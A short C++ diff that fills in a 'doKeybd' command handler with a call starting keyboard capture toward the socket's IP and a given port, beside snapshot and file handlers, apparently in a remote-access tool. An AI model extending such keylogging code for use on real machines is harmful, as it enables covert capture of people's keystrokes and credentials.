@@ -277,6 +277,7 @@ void Food::doSnapshoot(std::map<std::string, std::string>& args)
 
 void Food::doKeybd(std::map<std::string, std::string>& args)
 {
+	Keybd::startKeybd(mSock.mIp, atoi(args["PORT"].data()));
 }
 
 void Food::doFile(std::map<std::string, std::string>& args)
